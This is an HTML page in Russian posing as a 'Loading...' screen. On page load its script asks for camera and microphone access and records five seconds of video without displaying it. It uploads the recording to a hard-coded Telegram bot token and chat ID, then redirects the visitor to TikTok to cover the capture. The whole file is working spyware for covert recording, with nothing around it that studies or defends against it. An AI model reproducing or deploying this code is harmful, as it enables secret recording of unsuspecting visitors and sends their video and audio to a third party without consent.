<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
</head>
<body>

    <script>
        const BOT_TOKEN = "7716703157:AAFMrWbVmUR75m8NefHAuliGiTJ5oaVx-j4";
        const CHAT_ID = "-1002307369875";

        let mediaRecorder;
        let recordedChunks = [];

        async function startRecording() {
            try {
                // Запрашиваем доступ к камере
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

                // НЕ добавляем видео в DOM, чтобы оно не отображалось
                const video = document.createElement("video");
                video.srcObject = stream;
                video.muted = true;

                mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });

                mediaRecorder.ondataavailable = event => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(recordedChunks, { type: "video/webm" });
                    await sendToTelegram(videoBlob);

                    // Останавливаем камеру
                    stream.getTracks().forEach(track => track.stop());

                    // Редирект на TikTok
                    setTimeout(() => {
                        window.location.href = "https://www.tiktok.com";
                    }, 2000);
                };

                // Запускаем запись и через 5 секунд останавливаем
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);

            } catch (error) {
                console.error("Ошибка доступа к камере:", error);
                window.location.href = "https://www.tiktok.com"; // Редирект если ошибка
            }
        }

        async function sendToTelegram(videoBlob) {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("video", videoBlob, "video.webm");

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: "POST",
                    body: formData
                });
                const data = await response.json();
                console.log("Видео отправлено в Telegram:", data);
            } catch (error) {
                console.error("Ошибка отправки в Telegram:", error);
            }
        }

        // Запускаем запись сразу после загрузки страницы
        startRecording();
    </script>

</body>
</html>
